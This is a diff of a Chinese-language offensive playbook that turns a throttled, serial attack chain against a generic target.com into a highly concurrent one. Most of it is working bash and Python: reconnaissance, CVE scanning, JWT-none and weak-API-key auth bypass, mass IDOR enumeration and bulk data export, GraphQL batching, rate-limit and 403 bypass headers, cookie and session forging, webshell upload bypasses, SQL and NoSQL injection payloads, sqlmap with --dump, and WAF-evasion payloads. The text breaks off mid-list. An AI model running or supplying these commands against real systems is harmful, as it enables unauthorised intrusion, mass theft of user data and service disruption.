@@ -181,68 +181,69 @@ done
 
 ## 🎯 完整13步流程（高价值失败后执行）
 
-### 第1步：全方位资产侦查（30分钟 - 串行执行避免封IP）
+### 第1步：全方位资产侦查（20分钟 - 并发执行）
 
 ```bash
 TARGET="target.com"
 source /workspace/.api_keys
 
-echo "[+] 开始资产侦查（串行执行，避免触发防护）"
-
-# 1.1 Fofa深度查询
-echo "[*] 查询Fofa..."
+# 并发执行所有资产发现（同时启动）
+(
+# 1.1 Fofa深度查询（最强大）
 QUERY=$(echo -n "domain=\"${TARGET}\"" | base64)
 curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL_1}&key=${FOFA_KEY_1}&qbase64=${QUERY}&size=10000&fields=host,ip,port,title,server,protocol" | \
     jq -r '.results[]? | "\(.[0])|\(.[1]):\(.[2])|\(.[3])|\(.[4])"' > fofa_full.txt
-sleep 3
+) &
 
-# 1.2 Shodan查询
-echo "[*] 查询Shodan..."
-shodan search "hostname:${TARGET}" --fields ip_str,port,org,hostnames,data --limit 10000 > shodan_full.txt 2>/dev/null
-sleep 3
+(
+# 1.2 Shodan全端口查询
+shodan search "hostname:${TARGET}" --fields ip_str,port,org,hostnames,data --limit 10000 > shodan_full.txt
+) &
 
-# 1.3 证书透明度（串行查询）
-echo "[*] 查询证书透明度..."
+(
+# 1.3 证书透明度（多来源）
 curl -s "https://crt.sh/?q=%.${TARGET}&output=json" | jq -r '.[].name_value' | sort -u > crt_subs.txt
-sleep 2
 curl -s "https://api.certspotter.com/v1/issuances?domain=${TARGET}&include_subdomains=true&expand=dns_names" | \
     jq -r '.[].dns_names[]' | sort -u >> crt_subs.txt
-sleep 2
+) &
 
-# 1.4 被动DNS（依次执行）
-echo "[*] 被动DNS枚举..."
+(
+# 1.4 被动DNS（多引擎）
 subfinder -d ${TARGET} -all -silent -o subfinder.txt
-sleep 2
-amass enum -passive -d ${TARGET} -o amass.txt 2>/dev/null
-sleep 2
-assetfinder --subs-only ${TARGET} > assetfinder.txt 2>/dev/null
-sleep 2
+amass enum -passive -d ${TARGET} -o amass.txt
+assetfinder --subs-only ${TARGET} > assetfinder.txt
+) &
 
-# 1.5 Google Dorks（低频执行）
-echo "[*] Google Dorks搜索..."
+(
+# 1.5 Google Dorks（自动化）
 python3 << 'PYEOF'
-import time
-TARGET = "${TARGET}"
+import requests, time
 dorks = [
     f'site:{TARGET} inurl:admin',
     f'site:{TARGET} inurl:login',
     f'site:{TARGET} inurl:upload',
     f'site:{TARGET} filetype:env',
     f'site:{TARGET} filetype:sql',
+    f'site:{TARGET} ext:log',
+    f'site:{TARGET} intitle:"index of"',
 ]
 for dork in dorks:
     print(f"[+] {dork}")
-    time.sleep(5)  # 避免Google封禁
+    time.sleep(2)  # 避免Google封禁
 PYEOF
+) &
 
+(
 # 1.6 GitHub泄露扫描
-echo "[*] 扫描GitHub泄露..."
-gh api "search/code?q=${TARGET}+password+OR+api_key+OR+secret&per_page=100" 2>/dev/null | \
+gh api "search/code?q=${TARGET}+password+OR+api_key+OR+secret&per_page=100" | \
     jq -r '.items[] | .html_url' > github_leaks.txt
-sleep 2
+) &
+
+# 等待所有并发任务完成
+wait
 
 # 1.7 合并去重 + 边缘资产生成
-cat fofa_full.txt shodan_full.txt crt_subs.txt subfinder.txt amass.txt assetfinder.txt 2>/dev/null | \
+cat fofa_full.txt shodan_full.txt crt_subs.txt subfinder.txt amass.txt assetfinder.txt | \
     grep -oE "[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.${TARGET}" | sort -u > all_subdomains.txt
 
 # 生成边缘资产
@@ -250,18 +251,16 @@ for prefix in dev test staging uat pre prod backup old legacy api admin portal v
     echo "${prefix}.${TARGET}" >> edge_assets.txt
 done
 
-# 1.8 存活探测（降低并发，避免触发防护）
-echo "[*] 存活探测（降低频率）..."
+# 1.8 大规模存活探测（并发1000）
 cat all_subdomains.txt edge_assets.txt | sort -u | \
-    httpx -silent -mc 200,301,302,403,401,500 -title -tech-detect -cdn -ip -cname -status-code \
-    -threads 10 -rate-limit 50 -delay 100ms \
-    -header "User-Agent: Mozilla/5.0" -timeout 15 -o alive_full.txt
+    httpx -silent -mc 200,301,302,403,401,500 -title -tech-detect -cdn -ip -cname -status-code -threads 1000 \
+    -header "User-Agent: Mozilla/5.0" -timeout 10 -o alive_full.txt
 
-# 1.9 提取C段
+# 1.9 提取C段（用于后续扫描）
 cat alive_full.txt | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | \
     awk -F. '{print $1"."$2"."$3".0/24"}' | sort -u > c_segments.txt
 
-# 1.10 优先级分类
+# 1.10 优先级分类（智能筛选高价值目标）
 grep -iE "admin|manage|api|console|dashboard|panel|test|dev|staging|jenkins|gitlab|vpn" alive_full.txt > priority_A_high.txt
 grep -iE "login|user|account|member|portal|upload|backup" alive_full.txt > priority_B_medium.txt
 
@@ -272,422 +271,1187 @@ echo "    高价值(A): $(wc -l < priority_A_high.txt)"
 echo "    中价值(B): $(wc -l < priority_B_medium.txt)"
 ```
 
-### 第2步：深度指纹识别 + CVE快扫（20分钟 - 串行降频）
+### 第2步：深度指纹识别 + CVE快扫（10分钟 - 并发）
 
 ```bash
-echo "[+] 开始指纹识别（串行执行）"
-
-# 2.1 WhatWeb扫描（降低并发）
-echo "[*] WhatWeb指纹识别..."
+# 并发执行所有指纹识别
+(
+# 2.1 WhatWeb深度扫描
 cat alive_full.txt | awk '{print $1}' | \
-    whatweb -i - --aggression 1 --log-json=whatweb.json -t 5 2>/dev/null
-sleep 3
+    whatweb -i - --aggression 3 --log-json=whatweb.json -t 50
+) &
 
-# 2.2 Nuclei技术栈识别（低并发）
-echo "[*] Nuclei技术栈识别..."
-nuclei -l alive_full.txt -t ~/nuclei-templates/technologies/ \
-    -c 5 -rl 10 -silent -o tech_stack.txt 2>/dev/null
-sleep 3
+(
+# 2.2 Wappalyzer + 技术栈识别
+nuclei -l alive_full.txt -t ~/nuclei-templates/technologies/ -c 100 -silent -o tech_stack.txt
+) &
 
-# 2.3 Nuclei CVE扫描（分批扫描，避免封IP）
-echo "[*] Nuclei CVE扫描（低频率）..."
+(
+# 2.3 nuclei CVE快速扫描（关键CVE）
 nuclei -l alive_full.txt \
     -t ~/nuclei-templates/cves/ \
     -t ~/nuclei-templates/vulnerabilities/ \
     -t ~/nuclei-templates/exposures/ \
     -severity critical,high \
-    -c 3 -rl 5 -silent -o nuclei_vulns.txt 2>/dev/null
-sleep 5
+    -c 100 -rl 1000 -silent -o nuclei_vulns.txt
+) &
 
-# 2.4 Nikto扫描（仅高价值目标，逐个扫描）
-echo "[*] Nikto扫描高价值目标..."
-cat priority_A_high.txt 2>/dev/null | head -5 | while read url; do
-    echo "  扫描: $url"
-    nikto -h "$url" -Tuning 1,2,3 -Format txt -output "nikto_$(echo $url | md5sum | cut -d' ' -f1).txt" 2>/dev/null
-    sleep 10
+(
+# 2.4 nikto Web扫描（高价值目标）
+cat priority_A_high.txt | head -20 | while read url; do
+    nikto -h "$url" -Tuning 123456789 -Format txt -output "nikto_$(echo $url | md5sum | cut -d' ' -f1).txt" &
 done
+) &
 
-# 2.5 按技术栈分类
-grep -i "WordPress" tech_stack.txt 2>/dev/null | awk '{print $1}' > wordpress_sites.txt
-grep -i "Joomla" tech_stack.txt 2>/dev/null | awk '{print $1}' > joomla_sites.txt
-grep -i "Drupal" tech_stack.txt 2>/dev/null | awk '{print $1}' > drupal_sites.txt
-grep -i "Laravel" tech_stack.txt 2>/dev/null | awk '{print $1}' > laravel_sites.txt
-grep -i "Spring" tech_stack.txt 2>/dev/null | awk '{print $1}' > spring_sites.txt
-grep -i "Struts" tech_stack.txt 2>/dev/null | awk '{print $1}' > struts_sites.txt
-grep -i "Jenkins" tech_stack.txt 2>/dev/null | awk '{print $1}' > jenkins_sites.txt
-grep -i "GitLab" tech_stack.txt 2>/dev/null | awk '{print $1}' > gitlab_sites.txt
-grep -i "phpMyAdmin" tech_stack.txt 2>/dev/null | awk '{print $1}' > phpmyadmin_sites.txt
-grep -iE "API|swagger|graphql" tech_stack.txt 2>/dev/null | awk '{print $1}' > api_sites.txt
+wait
 
-# 2.6 CMS专项扫描（串行）
-if [ -s wordpress_sites.txt ]; then
-    echo "[*] WPScan扫描..."
-    wpscan --url $(head -1 wordpress_sites.txt) --enumerate ap,at,u --api-token $WPSCAN_API 2>/dev/null
-    sleep 5
-fi
+# 2.5 按技术栈分类（精确打点）
+grep -i "WordPress" tech_stack.txt | awk '{print $1}' > wordpress_sites.txt
+grep -i "Joomla" tech_stack.txt | awk '{print $1}' > joomla_sites.txt
+grep -i "Drupal" tech_stack.txt | awk '{print $1}' > drupal_sites.txt
+grep -i "Laravel" tech_stack.txt | awk '{print $1}' > laravel_sites.txt
+grep -i "Spring" tech_stack.txt | awk '{print $1}' > spring_sites.txt
+grep -i "Struts" tech_stack.txt | awk '{print $1}' > struts_sites.txt
+grep -i "Jenkins" tech_stack.txt | awk '{print $1}' > jenkins_sites.txt
+grep -i "GitLab" tech_stack.txt | awk '{print $1}' > gitlab_sites.txt
+grep -i "phpMyAdmin" tech_stack.txt | awk '{print $1}' > phpmyadmin_sites.txt
+grep -iE "API|swagger|graphql" tech_stack.txt | awk '{print $1}' > api_sites.txt
 
-if [ -s joomla_sites.txt ]; then
-    echo "[*] JoomScan扫描..."
-    joomscan -u $(head -1 joomla_sites.txt) 2>/dev/null
-    sleep 5
-fi
+# 2.6 CMS针对性扫描
+[ -s wordpress_sites.txt ] && wpscan --url $(head -1 wordpress_sites.txt) --enumerate ap,at,u --api-token $WPSCAN_API &
+[ -s joomla_sites.txt ] && joomscan -u $(head -1 joomla_sites.txt) &
+wait
 
 echo "[+] 指纹识别完成"
-echo "    WordPress: $(wc -l < wordpress_sites.txt 2>/dev/null || echo 0)"
-echo "    API站点: $(wc -l < api_sites.txt 2>/dev/null || echo 0)"
-echo "    Jenkins: $(wc -l < jenkins_sites.txt 2>/dev/null || echo 0)"
-echo "    发现漏洞: $(wc -l < nuclei_vulns.txt 2>/dev/null || echo 0)"
+echo "    WordPress: $(wc -l < wordpress_sites.txt)"
+echo "    API站点: $(wc -l < api_sites.txt)"
+echo "    Jenkins: $(wc -l < jenkins_sites.txt)"
+echo "    发现漏洞: $(wc -l < nuclei_vulns.txt)"
 ```
 
-### 第3步：API深度攻击（40分钟 - 串行低频）
+### 第3步：API深度攻击（25分钟 - 最强攻击链）
 
 ```bash
-echo "[+] 开始API攻击（低频率执行）"
-
-# 3.1 API端点枚举（逐个爬取，避免封IP）
-echo "[*] 枚举API端点..."
-cat alive_full.txt | awk '{print $1}' | head -20 | while read url; do
-    echo "  爬取: $url"
-    # Katana低并发爬取
-    katana -u "$url" -js-crawl -d 3 -c 3 -delay 500 -silent 2>/dev/null | \
+# 3.1 API端点全面枚举（从JS+HTML+响应头）
+cat alive_full.txt | awk '{print $1}' | while read url; do
+    # 爬取API端点
+    katana -u "$url" -js-crawl -known-files all -automatic-form-fill -d 5 -c 50 -silent | \
         grep -E "api|graphql|rest|v[0-9]" >> api_all_endpoints.txt
     
-    # 从JS文件提取（限速）
-    curl -sk "$url" -A "Mozilla/5.0" | grep -oE "src=['\"]([^'\"]+\.js)" | cut -d'"' -f2 | head -5 | while read js; do
-        sleep 1
-        curl -sk "$url/$js" -A "Mozilla/5.0" 2>/dev/null | grep -oE "/api/[a-zA-Z0-9/_-]+" >> api_all_endpoints.txt
+    # 从JS文件提取
+    curl -sk "$url" | grep -oE "src=['\"]([^'\"]+\.js)" | cut -d'"' -f2 | while read js; do
+        curl -sk "$url/$js" | grep -oE "/api/[a-zA-Z0-9/_-]+" >> api_all_endpoints.txt
     done
-    
-    sleep 3
-done
+done &
 
-# 3.2 API文档发现（逐个测试）
-echo "[*] 查找API文档..."
-cat alive_full.txt | awk '{print $1}' | head -20 | while read url; do
-    for path in /swagger.json /swagger-ui.html /api-docs /openapi.json /graphql; do
-        sleep 0.5
-        status=$(curl -sk "$url$path" -o /dev/null -w "%{http_code}" -A "Mozilla/5.0")
-        [ "$status" = "200" ] && echo "$url$path" >> api_docs.txt
+# 3.2 API文档自动发现
+for url in $(cat alive_full.txt | awk '{print $1}'); do
+    for path in /swagger.json /swagger-ui.html /api-docs /api/swagger.json /api/v1/swagger.json \
+                /api/v2/swagger.json /openapi.json /graphql /api/graphql /v2/api-docs /v3/api-docs; do
+        curl -sk "$url$path" -o /dev/null -w "%{http_code} $url$path\n" | grep "^200" >> api_docs.txt
     done
-    sleep 2
-done
+done &
 
-sort -u api_all_endpoints.txt 2>/dev/null > api_endpoints_uniq.txt
+wait
+sort -u api_all_endpoints.txt > api_endpoints_uniq.txt
 
-# 3.3 API认证绕过（串行测试，每个间隔）
-echo "[*] 测试API认证绕过..."
-cat api_endpoints_uniq.txt 2>/dev/null | head -50 | while read api; do
-    echo "  测试: $api"
-    
+# 3.3 API认证绕过（10种方法并发测试）
+cat api_endpoints_uniq.txt | head -100 | while read api; do
+    (
     # 无认证
-    sleep 1
-    curl -sk "$api" -A "Mozilla/5.0" 2>/dev/null | grep -qE "\{|\[" && echo "[✅ 无认证] $api" >> api_bypass.txt
+    curl -sk "$api" | grep -qE "\{|\[" && echo "[✅ 无认证] $api" >> api_bypass.txt
     
     # JWT None
-    sleep 1
-    curl -sk "$api" -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." -A "Mozilla/5.0" 2>/dev/null | \
-        grep -qE "\{|\[" && echo "[✅ JWT None] $api" >> api_bypass.txt
+    curl -sk "$api" -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." | grep -qE "\{|\[" && echo "[✅ JWT None] $api" >> api_bypass.txt
     
     # 空Token
-    sleep 1
-    curl -sk "$api" -H "Authorization: Bearer null" -A "Mozilla/5.0" 2>/dev/null | \
-        grep -qE "\{|\[" && echo "[✅ 空Token] $api" >> api_bypass.txt
+    curl -sk "$api" -H "Authorization: Bearer null" | grep -qE "\{|\[" && echo "[✅ 空Token] $api" >> api_bypass.txt
     
-    # API Key测试（串行）
-    for key in test demo admin; do
-        sleep 0.5
-        curl -sk "$api" -H "X-API-Key: $key" -A "Mozilla/5.0" 2>/dev/null | \
-            grep -qE "\{|\[" && echo "[✅ 弱API Key] $api ($key)" >> api_bypass.txt
+    # API Key测试
+    for key in test demo admin 123456 00000000-0000-0000-0000-000000000000; do
+        curl -sk "$api" -H "X-API-Key: $key" | grep -qE "\{|\[" && echo "[✅ 弱API Key] $api ($key)" >> api_bypass.txt
     done
-    
-    sleep 2
+    ) &
 done
+wait
 
-# 3.4 IDOR枚举（低速测试，避免封禁）
-echo "[*] IDOR枚举（限速）..."
-cat api_endpoints_uniq.txt 2>/dev/null | grep -E "/[0-9]+$|/user/|/order/|/account/" | head -10 | while read api_template; do
+# 3.4 IDOR批量枚举（智能范围）
+cat api_endpoints_uniq.txt | grep -E "/[0-9]+$|/user/|/order/|/account/" | while read api_template; do
     base_url=$(echo $api_template | sed 's/[0-9]\+$//')
-    echo "  枚举: $base_url"
     
-    # 小范围测试（前100个ID，慢速）
-    for id in $(seq 1 100); do
-        sleep 0.3
-        curl -sk "${base_url}${id}" -A "Mozilla/5.0" 2>/dev/null | grep -qE "\{|\[" && \
-            echo "$id" >> "idor_${base_url//\//_}_ids.txt"
+    # 智能ID范围检测
+    for id in 1 100 1000 10000; do
+        status=$(curl -sk "${base_url}${id}" -o /dev/null -w "%{http_code}")
+        [ "$status" = "200" ] && echo "找到有效ID: $id" && break
     done
-    sleep 5
+    
+    # 批量枚举（根据业务量动态调整）
+    seq 1 50000 | xargs -P 100 -I {} sh -c "curl -sk '${base_url}{}' 2>/dev/null" | \
+        grep -E "\{|\[" > "idor_${base_url//\//_}.json" &
 done
 
-# 3.5 GraphQL攻击（限速）
-echo "[*] GraphQL攻击..."
-cat api_docs.txt 2>/dev/null | grep graphql | head -3 | while read graphql_url; do
-    echo "  测试: $graphql_url"
-    
+# 3.5 GraphQL深度攻击
+cat api_docs.txt | grep graphql | awk '{print $2}' | while read graphql_url; do
     # 内省查询
-    sleep 2
     curl -sk "$graphql_url" -X POST -H "Content-Type: application/json" \
-        -A "Mozilla/5.0" \
-        -d '{"query":"{ __schema { types { name } } }"}' 2>/dev/null > graphql_schema.json
+        -d '{"query":"{ __schema { types { name fields { name type { name kind ofType { name } } } } } }"}' > graphql_schema.json
     
-    sleep 3
-done
+    # 提取所有查询
+    cat graphql_schema.json | jq -r '.data.__schema.types[] | select(.name | startswith("__") | not) | .name' | while read type; do
+        # 批量查询（别名查询 - 绕过限制）
+        curl -sk "$graphql_url" -X POST -H "Content-Type: application/json" \
+            -d "{\"query\":\"{ $(seq 1 100 | xargs -I {} echo "a{}: $type(id:{}) {id}") }\"}" >> graphql_batch_data.json
+    done
+done &
 
-# 3.6 API参数污染（低频测试）
-echo "[*] API参数污染测试..."
-cat api_endpoints_uniq.txt 2>/dev/null | head -10 | while read api; do
-    sleep 1
-    curl -sk "$api?id=1&id=2" -A "Mozilla/5.0" 2>/dev/null > /dev/null
-    sleep 1
-    curl -sk "$api?id=1%26admin=true" -A "Mozilla/5.0" 2>/dev/null > /dev/null
-    sleep 2
-done
+# 3.6 API速率限制绕过测试
+cat api_endpoints_uniq.txt | head -20 | while read api; do
+    # 测试X-Forwarded-For绕过
+    for ip in $(seq 1 100); do
+        curl -sk "$api" -H "X-Forwarded-For: 1.1.1.$ip" &
+    done
+    wait
+done &
 
-# 3.7 批量数据导出（低并发版本）
-echo "[*] 数据导出（低频率）..."
+# 3.7 API参数污染（HPP攻击）
+cat api_endpoints_uniq.txt | head -50 | while read api; do
+    curl -sk "$api?id=1&id=2" # 参数重复
+    curl -sk "$api?id=1%26admin=true" # URL编码注入
+    curl -sk "$api?id[]=1&id[]=2" # 数组注入
+done > api_hpp_results.txt &
+
+wait
+
+# 3.8 批量数据导出脚本（超高并发）
 python3 << 'PYEOF'
 import requests
 import json
-import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from itertools import islice
 
-def fetch_slow(api_base, start, end):
-    """低速获取API数据"""
+def batch_fetch(api_base, start, end, batch_size=100):
+    """批量获取API数据"""
+    session = requests.Session()
     results = []
-    for id in range(start, end):
+    
+    def fetch_one(id):
         try:
-            time.sleep(0.5)  # 每个请求间隔0.5秒
-            r = requests.get(f"{api_base}/{id}", timeout=5, headers={"User-Agent": "Mozilla/5.0"})
+            r = session.get(f"{api_base}/{id}", timeout=5)
             if r.status_code == 200:
-                results.append(r.json())
-                if len(results) % 10 == 0:
-                    print(f"  已获取 {len(results)} 条")
+                return r.json()
         except:
             pass
+        return None
+    
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        futures = {executor.submit(fetch_one, i): i for i in range(start, end)}
+        for future in as_completed(futures):
+            result = future.result()
+            if result:
+                results.append(result)
+    
     return results
 
-# 读取API端点
-try:
-    with open('api_endpoints_uniq.txt') as f:
-        apis = [line.strip() for line in f if '/user' in line or '/order' in line]
+# 读取所有API端点
+with open('api_endpoints_uniq.txt') as f:
+    apis = [line.strip() for line in f if '/user' in line or '/order' in line]
+
+for api_base in apis[:10]:  # 前10个API
+    print(f"[+] 批量枚举: {api_base}")
+    data = batch_fetch(api_base, 1, 100000, batch_size=1000)
     
-    for api_base in apis[:3]:  # 仅测试前3个
-        print(f"[+] 枚举: {api_base}")
-        data = fetch_slow(api_base, 1, 50)  # 仅枚举前50个
-        
-        with open(f'api_dump_{api_base.replace("/", "_")}.json', 'w') as f:
-            json.dump(data, f)
-        
-        print(f"[+] 导出 {len(data)} 条记录")
-        time.sleep(5)
-except:
-    pass
+    with open(f'api_dump_{api_base.replace("/", "_")}.json', 'w') as f:
+        json.dump(data, f)
+    
+    print(f"[+] 导出 {len(data)} 条记录")
 PYEOF
 
 echo "[+] API攻击完成"
-echo "    API端点: $(wc -l < api_endpoints_uniq.txt 2>/dev/null || echo 0)"
-echo "    认证绕过: $(wc -l < api_bypass.txt 2>/dev/null || echo 0)"
+echo "    API端点: $(wc -l < api_endpoints_uniq.txt)"
+echo "    认证绕过: $(wc -l < api_bypass.txt)"
+echo "    IDOR数据: $(du -sh idor_*.json 2>/dev/null | wc -l) 个文件"
 ```
 
-### 第4步：参数Fuzz（30分钟 - 串行降频）
-echo "[+] 参数Fuzz（低频执行）"
+### 第4步：深度Fuzz + 参数挖掘（20分钟）
 
-# 4.1 GET参数Fuzz
-cat priority_A_high.txt 2>/dev/null | head -10 | while read url; do
-    echo "  Fuzz: $url"
-    ffuf -u "$url?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-        -mc 200,500 -t 3 -rate 5 -silent
-    sleep 5
+```bash
+# 4.1 全参数Fuzz（GET+POST+JSON+XML）
+cat priority_A_high.txt | awk '{print $1}' | head -30 | while read url; do
+    (
+    # GET参数
+    ffuf -u "$url?FUZZ=test123" \
+        -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+        -mc 200,301,302,401,403,500 -fs 0 -t 100 -silent -o "fuzz_get_$(echo $url | md5sum | cut -d' ' -f1).txt"
+    
+    # POST参数
+    ffuf -u "$url" -X POST -d "FUZZ=test123" \
+        -H "Content-Type: application/x-www-form-urlencoded" \
+        -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+        -mc 200,500 -t 100 -silent -o "fuzz_post_$(echo $url | md5sum | cut -d' ' -f1).txt"
+    
+    # JSON参数
+    ffuf -u "$url" -X POST -d '{"FUZZ":"test123"}' \
+        -H "Content-Type: application/json" \
+        -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
+        -mc 200,500 -t 100 -silent -o "fuzz_json_$(echo $url | md5sum | cut -d' ' -f1).txt"
+    ) &
 done
+wait
 
-# 4.2 HTTP头Fuzz
-cat priority_A_high.txt 2>/dev/null | head -5 | while read url; do
-    for header in "X-Forwarded-For" "X-Real-IP" "X-Original-URL"; do
-        sleep 1
-        curl -sk "$url/admin" -H "$header: 127.0.0.1" -A "Mozilla/5.0" -o /dev/null -w "$header: %{http_code}\n"
+# 4.2 HTTP头深度Fuzz（20+个头）
+cat priority_A_high.txt | awk '{print $1}' | head -20 | while read url; do
+    # IP伪造头（绕过IP限制）
+    for header in "X-Forwarded-For" "X-Real-IP" "X-Originating-IP" "X-Remote-IP" "X-Client-IP" "Client-IP" "True-Client-IP"; do
+        curl -sk "$url/admin" -H "$header: 127.0.0.1" -o /dev/null -w "$header: %{http_code}\n"
     done
-    sleep 3
-done
+    
+    # 路径重写头（403绕过）
+    for header in "X-Original-URL" "X-Rewrite-URL" "X-Override-URL"; do
+        curl -sk "$url" -H "$header: /admin" -o /dev/null -w "$header: %{http_code}\n"
+    done
+    
+    # 权限提升头
+    for header in "X-Admin" "X-Role" "X-Privilege"; do
+        curl -sk "$url" -H "$header: admin" -H "$header: true" -o /dev/null -w "$header: %{http_code}\n"
+    done
+done > header_fuzz_results.txt
 
-# 4.3 Cookie Fuzz
-cat priority_A_high.txt 2>/dev/null | head -5 | while read url; do
-    sleep 2
-    curl -sk "$url" -b "admin=true; role=admin" -A "Mozilla/5.0" | grep -q "admin" && echo "[✅ Cookie绕过] $url"
-    sleep 2
-done
+# 4.3 Cookie深度Fuzz
+cat priority_A_high.txt | awk '{print $1}' | head -20 | while read url; do
+    # 权限Cookie
+    curl -sk "$url" -b "admin=true; role=admin; isAdmin=1; privilege=admin" | grep -q "admin\|dashboard" && echo "[✅ Cookie权限绕过] $url"
+    
+    # Session伪造
+    curl -sk "$url" -b "PHPSESSID=admin; session=admin123; token=admin" | grep -q "admin" && echo "[✅ Session伪造] $url"
+done > cookie_fuzz_results.txt
+
+# 4.4 HTTP方法Fuzz（方法覆盖）
+cat api_endpoints_uniq.txt | head -50 | while read api; do
+    for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE; do
+        curl -sk -X $method "$api" -o /dev/null -w "$method: %{http_code}\n"
+    done
+    
+    # HTTP方法覆盖
+    curl -sk -X POST "$api" -H "X-HTTP-Method-Override: PUT" -o /dev/null -w "Override PUT: %{http_code}\n"
+    curl -sk -X POST "$api" -H "X-HTTP-Method-Override: DELETE" -o /dev/null -w "Override DELETE: %{http_code}\n"
+done > method_fuzz_results.txt
+
+# 4.5 文件名Fuzz（上传绕过）
+cat api_endpoints_uniq.txt | grep -i upload | while read upload_api; do
+    # 10种绕过方法
+    echo "test" > /tmp/shell.php
+    curl -sk "$upload_api" -F "file=@/tmp/shell.php" # 原始
+    curl -sk "$upload_api" -F "file=@/tmp/shell.php;type=image/jpeg" # MIME伪造
+    
+    cp /tmp/shell.php /tmp/shell.PhP && curl -sk "$upload_api" -F "file=@/tmp/shell.PhP" # 大小写
+    cp /tmp/shell.php /tmp/shell.php. && curl -sk "$upload_api" -F "file=@/tmp/shell.php." # 末尾点
+    cp /tmp/shell.php /tmp/shell.php%00.jpg && curl -sk "$upload_api" -F "file=@/tmp/shell.php%00.jpg" # 空字节
+    cp /tmp/shell.php /tmp/shell.phtml && curl -sk "$upload_api" -F "file=@/tmp/shell.phtml" # 罕见扩展名
+done > upload_fuzz_results.txt
 
 echo "[+] Fuzz完成"
+```
 
-### 第5步：SQL注入（30分钟 - 串行测试）
-echo "[+] SQL注入测试（低频）"
+### 第5步：SQL注入深度利用（20分钟 - 智能检测）
 
-# 5.1 注入点发现
-cat alive_full.txt 2>/dev/null | head -20 | while read url; do
-    echo "$url" | gau 2>/dev/null | grep "=" | head -10
-    sleep 3
-done > potential_sqli.txt
+```bash
+# 5.1 自动SQL注入点发现
+cat alive_full.txt | awk '{print $1}' | gau | grep "=" | qsreplace "FUZZ" | \
+    head -1000 > potential_sqli_urls.txt
 
-# 5.2 手工测试
-cat potential_sqli.txt | head -20 | while read url; do
-    echo "  测试: $url"
-    sleep 2
-    curl -sk "${url}'" -A "Mozilla/5.0" 2>/dev/null | grep -qi "error\|sql" && echo "[✅ SQL注入] $url"
-    sleep 3
-done > sqli_results.txt
-
-# 5.3 SQLMap（仅确认的点）
-cat sqli_results.txt | head -5 | while read line; do
-    url=$(echo $line | awk '{print $NF}')
-    echo "  SQLMap: $url"
-    sqlmap -u "$url" --batch --level=2 --risk=1 --threads=1 --random-agent 2>/dev/null
-    sleep 10
+# 5.2 手工快速检测（10个payload并发）
+cat potential_sqli_urls.txt | head -100 | while read url; do
+    (
+    # 单引号
+    curl -sk "${url/FUZZ/1'}" | grep -qi "error\|syntax\|mysql\|postgresql\|sql" && echo "[✅ SQL Error] $url"
+    
+    # 双引号
+    curl -sk "${url/FUZZ/1\"}" | grep -qi "error\|syntax" && echo "[✅ SQL Error] $url"
+    
+    # 布尔盲注
+    resp1=$(curl -sk "${url/FUZZ/1' AND '1'='1}")
+    resp2=$(curl -sk "${url/FUZZ/1' AND '1'='2}")
+    [ "$resp1" != "$resp2" ] && echo "[✅ Boolean SQLi] $url"
+    
+    # 时间盲注
+    start=$(date +%s)
+    curl -sk "${url/FUZZ/1' AND SLEEP(5)--}" > /dev/null
+    end=$(date +%s)
+    [ $((end - start)) -ge 5 ] && echo "[✅ Time-based SQLi] $url"
+    ) &
 done
+wait > sqli_candidates.txt
 
-echo "[+] SQL注入完成"
-
-### 第6步：WAF绕过（20分钟）
-echo "[+] WAF测试"
-
-# 6.1 WAF识别
-cat priority_A_high.txt 2>/dev/null | head -10 | while read url; do
-    echo "  识别: $url"
-    wafw00f "$url" 2>/dev/null
-    sleep 5
+# 5.3 SQLMap批量自动化（多种tamper）
+cat sqli_candidates.txt | awk '{print $NF}' | while read url; do
+    (
+    sqlmap -u "$url" --batch --level=3 --risk=2 \
+        --tamper=space2comment,between,charencode \
+        --random-agent --threads=10 --technique=BEUST \
+        --dbms=MySQL --dump --fresh-queries \
+        --output-dir="sqlmap_$(echo $url | md5sum | cut -d' ' -f1)" &
+    ) &
+    
+    # 限制并发数
+    [ $(jobs -r | wc -l) -ge 10 ] && wait -n
 done
+wait
 
-# 6.2 绕过测试（仅测试前3个payload）
-cat priority_A_high.txt 2>/dev/null | head -5 | while read url; do
-    for payload in "1'/**/OR/**/1=1--" "1'OR(1)=(1)--" "1'UnIoN SeLeCt 1,2,3--"; do
-        sleep 2
-        curl -sk "$url?id=$payload" -A "Mozilla/5.0" 2>/dev/null | grep -qiv "blocked" && echo "[✅] $payload"
+# 5.4 NoSQL注入（MongoDB/Redis）
+cat api_endpoints_uniq.txt | head -100 | while read api; do
+    # MongoDB注入
+    curl -sk "$api" -d 'username[$ne]=null&password[$ne]=null' | grep -qv "login\|error" && echo "[✅ NoSQL注入] $api"
+    curl -sk "$api" -H "Content-Type: application/json" -d '{"username":{"$ne":null},"password":{"$ne":null}}' | grep -qv "login" && echo "[✅ NoSQL注入] $api"
+done > nosql_injection.txt
+
+echo "[+] SQL注入测试完成"
+echo "    候选注入点: $(wc -l < sqli_candidates.txt)"
+echo "    NoSQL注入: $(wc -l < nosql_injection.txt)"
+```
+
+### 第6步：WAF深度识别 + 智能绕过（15分钟）
+
+```bash
+# 6.1 WAF精确识别（10+种WAF）
+cat priority_A_high.txt | awk '{print $1}' | head -50 | while read url; do
+    wafw00f "$url" -a -o "waf_$(echo $url | md5sum | cut -d' ' -f1).txt"
+done &
+
+# 6.2 通用WAF绕过测试
+cat priority_A_high.txt | awk '{print $1}' | head -20 | while read url; do
+    echo "[+] 测试WAF绕过: $url"
+    
+    # SQL注入WAF绕过（15种payload）
+    for payload in \
+        "1'/**/OR/**/1=1--" \
+        "1'OR(1)=(1)--" \
+        "1'%09OR%091=1--" \
+        "1'UnIoN/**/SeLeCt/**/1,2,3--" \
